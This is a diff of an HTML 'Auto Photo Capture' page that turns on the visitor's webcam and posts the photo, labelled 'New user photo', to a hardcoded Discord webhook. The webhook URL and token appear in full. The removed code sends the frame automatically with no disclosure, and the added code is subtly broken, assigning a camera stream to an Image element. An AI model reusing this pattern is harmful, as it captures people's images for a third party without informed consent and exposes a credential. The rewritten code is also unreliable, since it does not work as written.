@@ -4,57 +4,60 @@
     <title>Auto Photo Capture</title>
     <script>
         function capturePhoto() {
-            var video = document.getElementById('video');
-            var canvas = document.getElementById('canvas');
-            var context = canvas.getContext('2d');
-            
+            // Create a new image element
+            var img = new Image();
+
+            // Set the source of the image to the user's camera
             navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    video.play();
+                .then(function (stream) {
+                    img.srcObject = stream;
+                    document.body.appendChild(img);
                 })
-                .catch(function(error) {
+                .catch(function (error) {
                     console.log('Error accessing camera: ', error);
                 });
-            
-            video.addEventListener('canplay', function() {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                var image = canvas.toDataURL('image/png');
-                sendToDiscord(image);
-            });
         }
-        
-        function sendToDiscord(image) {
+
+        function sendToDiscord() {
+            // Get the image element
+            var img = document.querySelector('img');
+
+            // Convert the image to base64
+            var canvas = document.createElement('canvas');
+            var context = canvas.getContext('2d');
+            context.drawImage(img, 0, 0);
+            var base64Image = canvas.toDataURL('image/jpeg');
+
+            // Create a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+
+            // Set the webhook URL
             var webhookUrl = 'https://discord.com/api/webhooks/1187496675716104304/ZmCpK-ZLhY9sUloPNC-8bkmxyd2b3De52_oevo5cufS-kjts_eyvg5rKPo2qA8CzEmyZ';
-            
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: 'New user photo',
-                    embeds: [{
+
+            // Set the request method and URL
+            xhr.open('POST', webhookUrl, true);
+
+            // Set the request headers
+            xhr.setRequestHeader('Content-Type', 'application/json');
+
+            // Set the request body
+            var payload = {
+                content: 'New user photo',
+                embeds: [
+                    {
                         image: {
-                            url: image
+                            url: base64Image
                         }
-                    }]
-                })
-            })
-            .then(function(response) {
-                console.log('Photo sent to Discord');
-            })
-            .catch(function(error) {
-                console.log('Error sending photo to Discord: ', error);
-            });
+                    }
+                ]
+            };
+            xhr.send(JSON.stringify(payload));
         }
     </script>
 </head>
 <body>
     <h1>Auto Photo Capture</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
     <button onclick="capturePhoto()">Capture Photo</button>
+    <button onclick="sendToDiscord()">Send to Discord</button>
 </body>
 </html>
-
